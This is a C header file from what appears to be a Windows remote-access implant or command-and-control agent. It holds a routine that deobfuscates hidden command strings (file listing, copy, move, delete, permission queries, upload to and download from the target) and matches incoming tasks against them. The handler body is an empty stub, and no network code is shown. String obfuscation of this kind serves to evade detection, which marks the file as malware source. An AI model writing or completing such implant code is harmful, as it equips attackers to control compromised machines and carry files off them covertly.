#pragma once

#include <Windows.h>
#include "utils/winapi.h"
#include "utils/buffer.h"
#include "constants.h"

/*
Returns true if Task is meant for Filesystem module

PWD
CD DIR_PATH
CP SOURCE DESTINATION
MV SOURCE DESTINATION
RM SOURCE
LS
ICACLS /PATH/TO/FILE/ON/CLIENT
UPLOAD FILE_BYTES_B64 /PATH/TO/FILE/ON/TARGET
DOWNLOAD /PATH/TO/FILE/ON/CLIENT
*/
BOOL IsTaskForFilesystem(LPVOID pTask)
{
    if (pTask == NULL)
        return FALSE;

    // Prepare command strings
    static CHAR strAgentCapPwd[STRING_AGENT_CAP_PWD_LEN + 1] = ""; // "PWD"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_PWD,
        STRING_AGENT_CAP_PWD_LEN,
        strAgentCapPwd);

    static CHAR strAgentCapCd[STRING_AGENT_CAP_CD_LEN + 1] = ""; // "CD"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_CD,
        STRING_AGENT_CAP_CD_LEN,
        strAgentCapCd);

    static CHAR strAgentCapCp[STRING_AGENT_CAP_CP_LEN + 1] = ""; // "CP"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_CP,
        STRING_AGENT_CAP_CP_LEN,
        strAgentCapCp);

    static CHAR strAgentCapMv[STRING_AGENT_CAP_MV_LEN + 1] = ""; // "MV"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_MV,
        STRING_AGENT_CAP_MV_LEN,
        strAgentCapMv);

    static CHAR strAgentCapRm[STRING_AGENT_CAP_RM_LEN + 1] = ""; // "RM"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_RM,
        STRING_AGENT_CAP_RM_LEN,
        strAgentCapRm);

    static CHAR strAgentCapLs[STRING_AGENT_CAP_LS_LEN + 1] = ""; // "LS"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_LS,
        STRING_AGENT_CAP_LS_LEN,
        strAgentCapLs);

    static CHAR strAgentCapUpload[STRING_AGENT_CAP_UPLOAD_LEN + 1] = ""; // "UPLOAD"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_UPLOAD,
        STRING_AGENT_CAP_UPLOAD_LEN,
        strAgentCapUpload);

    static CHAR strAgentCapDownload[STRING_AGENT_CAP_DOWNLOAD_LEN + 1] = ""; // "DOWNLOAD"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_DOWNLOAD,
        STRING_AGENT_CAP_DOWNLOAD_LEN,
        strAgentCapDownload);

    static CHAR strAgentCapIcacls[STRING_AGENT_CAP_ICACLS_LEN + 1] = ""; // "ICACLS"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_ICACLS,
        STRING_AGENT_CAP_ICACLS_LEN,
        strAgentCapIcacls);

    return (
        CompareBuffer(pTask, strAgentCapPwd, STRING_AGENT_CAP_PWD_LEN) ||
        CompareBuffer(pTask, strAgentCapCd, STRING_AGENT_CAP_CD_LEN) ||
        CompareBuffer(pTask, strAgentCapCp, STRING_AGENT_CAP_CP_LEN) ||
        CompareBuffer(pTask, strAgentCapMv, STRING_AGENT_CAP_MV_LEN) ||
        CompareBuffer(pTask, strAgentCapRm, STRING_AGENT_CAP_RM_LEN) ||
        CompareBuffer(pTask, strAgentCapLs, STRING_AGENT_CAP_LS_LEN) ||
        CompareBuffer(pTask, strAgentCapUpload, STRING_AGENT_CAP_UPLOAD_LEN) ||
        CompareBuffer(pTask, strAgentCapDownload, STRING_AGENT_CAP_DOWNLOAD_LEN) ||
        CompareBuffer(pTask, strAgentCapIcacls, STRING_AGENT_CAP_ICACLS_LEN));
}

/* Handles task */
void HandleTaskFilesystem(WinApiCustom *pWinApiCustom, LPVOID pTask)
{
}

//////////////////////
// Individual handlers
//////////////////////

